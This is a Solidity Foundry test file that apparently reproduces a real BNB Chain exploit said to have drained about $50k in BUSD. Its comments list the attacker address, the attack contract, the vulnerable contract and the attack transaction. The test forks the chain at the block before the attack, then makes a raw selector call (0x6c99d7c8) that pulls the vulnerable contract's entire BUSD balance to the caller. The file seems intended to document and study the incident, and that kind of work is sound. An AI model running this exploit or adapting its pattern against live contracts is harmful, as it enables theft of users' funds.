// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo - Total Lost : ~50k $BUSD
// Attacker : https://bscscan.com/address/0x8ccf2860f38fc2f4a56dec897c8c976503fcb123
// Attack Contract : https://bscscan.com/address/0x64b9d294cd918204d1ee6bce283edb49302ddf7e
// Vulnerable Contract : https://bscscan.com/address/0xdb4b73df2f6de4afcd3a883efe8b7a4b0763822b
// Attack Tx : https://bscscan.com/tx/0x368f842e79a10bb163d98353711be58431a7cd06098d6f4b6cbbcd4c77b53108

import "forge-std/Test.sol";
import "./../interface.sol";

contract ContractTest is Test {
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 GAX = IERC20(0xD5d63074A39Bc0202E828B044C02c6F4d2f75c76);
    address VulnContract_addr = 0xdb4b73Df2F6dE4AFCd3A883efE8b7a4B0763822b;

    function setUp() public {
        vm.createSelectFork("bsc", 40375925 - 1);
        vm.label(address(BUSD), "BUSD");
        vm.label(address(GAX), "GAX");
        vm.label(address(VulnContract_addr), "VulnContract");
    }

    function testExploit() public {
        emit log_named_decimal_uint("Attacker BUSD balance before attack", BUSD.balanceOf(address(this)), 18);
        bytes memory data = abi.encode(0, BUSD.balanceOf(address(VulnContract_addr)), 0);
        VulnContract_addr.call(abi.encodeWithSelector(bytes4(0x6c99d7c8), data));
        emit log_named_decimal_uint("Attacker BUSD balance after attack", BUSD.balanceOf(address(this)), 18);
    }

    fallback() external payable {}
    receive() external payable {}
}
